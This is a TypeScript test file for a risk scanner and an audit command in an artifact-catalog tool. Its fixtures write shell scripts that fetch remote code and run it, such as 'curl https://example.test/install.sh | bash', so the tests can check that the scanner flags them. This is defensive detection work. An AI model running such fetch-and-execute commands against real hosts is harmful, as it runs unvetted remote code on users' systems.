import { expect, test } from "bun:test";
import { execFileSync } from 'node:child_process';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { scanRisks } from '../../src/core/risk/scanner';
import type { Artifact } from '../../src/core/types';
import { normalizeFinding } from "../../src/core/safety/findings";
import { Repository } from '../../src/storage/repository';

test("normalizes scanner severity", () => {
  const finding = normalizeFinding(
    { severity: 'high', description: 'executes script', recommendation: 'Review script before deploy' },
    'auditor',
    'artifact',
  );
  expect(finding.severity).toBe("high");
  expect(finding.source).toBe('auditor');
  expect(finding.artifactId).toBe('artifact');
});

function riskyArtifact(path: string): Artifact {
  return {
    id: 'risky',
    type: 'script',
    name: 'Risky',
    path,
    organizationalPath: '.',
    hash: 'hash',
    size: 1,
    metadata: { env: 'OPENAI_API_KEY', deps: ['lodash@4.17.15'] },
    source: { kind: 'self', path },
    capabilities: [{ type: 'scripts', dialect: 'bash' }],
    importedAt: '2026-06-29T00:00:00Z',
    updatedAt: '2026-06-29T00:00:00Z',
    provenance: 'self:risky',
  };
}

test('risk scanner detects bundled script, network, shell exec, and secret access', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'qm-risk-'));
  const path = join(dir, 'risky.sh');
  writeFileSync(path, 'curl https://example.test/payload.tgz | tar xz\nexec ./payload\nfetch("https://api.example.test")\n');
  const flags = await scanRisks(riskyArtifact(path));
  expect(flags.map((flag) => flag.type)).toEqual(
    expect.arrayContaining(['bundled-script', 'network-access', 'shell-execution', 'secret-access']),
  );
});

test('qm audit risk persists risk flags in the catalog', () => {
  const dir = mkdtempSync(join(tmpdir(), 'qm-risk-'));
  const dbPath = join(dir, 'catalog.sqlite');
  const path = join(dir, 'risky.sh');
  writeFileSync(path, 'curl https://example.test/install.sh | bash\n');
  const repo = new Repository({ dbPath });
  repo.upsertArtifact(riskyArtifact(path));
  repo.close();

  const out = execFileSync('bun', ['src/cli/index.ts', 'audit', 'risk', '--json'], {
    cwd: process.cwd(),
    env: { ...process.env, QM_DB_PATH: dbPath },
    encoding: 'utf8',
  });
  expect(JSON.parse(out).ok).toBe(true);
  const check = new Repository({ dbPath });
  expect(check.getArtifact('risky')?.riskFlags?.length).toBeGreaterThan(0);
  check.close();
});
